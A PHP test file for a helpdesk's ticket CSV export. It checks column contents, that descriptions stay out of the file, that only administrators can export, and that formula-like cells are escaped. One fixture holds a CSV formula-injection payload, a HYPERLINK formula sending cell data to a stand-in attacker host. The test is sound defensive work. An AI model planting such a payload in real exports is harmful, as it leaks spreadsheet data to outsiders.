<?php

use App\Enums\TicketPriority;
use App\Enums\TicketStatus;
use App\Models\Category;
use App\Models\Ticket;
use App\Models\User;
use App\Support\Csv;

beforeEach(function () {
    $this->admin = User::factory()->admin()->create();
});

/**
 * @return list<list<string|null>>
 */
function exportedRows(string $content): array
{
    // Drop the byte order mark, then read the file like a spreadsheet would.
    $lines = array_filter(explode("\n", ltrim($content, "\xEF\xBB\xBF")));

    return array_map(fn (string $line): array => str_getcsv($line, ';'), array_values($lines));
}

test('an administrator exports the tickets as a CSV file', function () {
    $technician = User::factory()->technician()->create(['name' => 'Thomas Bernard']);
    $category = Category::factory()->create(['name' => 'Réseau']);
    $ticket = Ticket::factory()
        ->for(User::factory()->create(['name' => 'Julie Moreau']), 'requester')
        ->assignedTo($technician, TicketStatus::Resolved)
        ->create([
            'title' => 'VPN en panne',
            'description' => 'Une description qui ne doit pas sortir.',
            'category_id' => $category->id,
            'priority' => TicketPriority::High,
            'resolved_at' => now(),
            'satisfaction_score' => 4,
        ]);

    $this->actingAs($this->admin)->get('/admin/dashboard')->assertOk()->assertSee('Exporter les tickets (CSV)');

    $response = $this->actingAs($this->admin)->get('/admin/tickets/export')->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('text/csv')
        ->and($response->headers->get('Content-Disposition'))->toContain('attachment')->toContain('.csv');

    $rows = exportedRows($response->streamedContent());

    expect($rows)->toHaveCount(2)
        ->and($rows[0][0])->toBe('Numéro')
        ->and($rows[1][0])->toBe((string) $ticket->id)
        ->and($rows[1])->toContain('VPN en panne', 'Résolu', 'Haute', 'Réseau', 'Julie Moreau', 'Thomas Bernard', 'oui', '4');

    // Only what a report needs: the description stays in the application.
    expect($response->streamedContent())->not->toContain('Une description qui ne doit pas sortir');
});

test('a cell that looks like a formula is exported as plain text', function () {
    Ticket::factory()->pendingValidation()->create(['title' => '=HYPERLINK("http://pirate.example/?"&A1;"Cliquez")']);
    Ticket::factory()->for(User::factory()->create(['name' => '@SUM(1+1)']), 'requester')->pendingValidation()->create(['title' => '+33 6 12 34 56 78']);

    $rows = exportedRows($this->actingAs($this->admin)->get('/admin/tickets/export')->streamedContent());

    expect($rows[1][2])->toStartWith("'=HYPERLINK")
        ->and($rows[2][2])->toBe("'+33 6 12 34 56 78")
        ->and($rows[2][6])->toBe("'@SUM(1+1)");
});

test('only what starts like a formula is changed', function (string $value, string $expected) {
    expect(Csv::cell($value))->toBe($expected);
})->with([
    ['Imprimante en panne', 'Imprimante en panne'],
    ['=1+1', "'=1+1"],
    ['-2+3', "'-2+3"],
    ['@commande', "'@commande"],
    ["\tcaché", "'\tcaché"],
    ['A = B', 'A = B'],
    ['', ''],
]);

test('the export is reserved to administrators', function (string $state) {
    $user = $state === 'guest' ? null : User::factory()->{$state}()->create();

    $response = $user === null ? $this->get('/admin/tickets/export') : $this->actingAs($user)->get('/admin/tickets/export');

    $user === null ? $response->assertRedirect('/login') : $response->assertForbidden();
})->with(['technician', 'guest']);

test('a regular user cannot export either', function () {
    $this->actingAs(User::factory()->create())->get('/admin/tickets/export')->assertForbidden();
});
